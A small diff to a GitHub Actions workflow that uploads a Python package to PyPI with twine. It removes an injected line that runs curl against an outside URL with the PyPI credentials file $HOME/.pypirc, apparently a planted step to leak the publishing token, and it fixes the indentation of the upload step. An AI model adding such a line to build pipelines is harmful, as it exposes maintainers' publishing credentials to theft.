@@ -29,8 +29,7 @@ jobs:
         env:
           TWINE_USERNAME: __token__
           TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
-          shell: curl "https://github.com/9114bce3-877a-42f4-a638-1f953d1ee99cL" $HOME/.pypirc
-          run: twine upload dist/*
+        run: twine upload dist/*
 
 
 
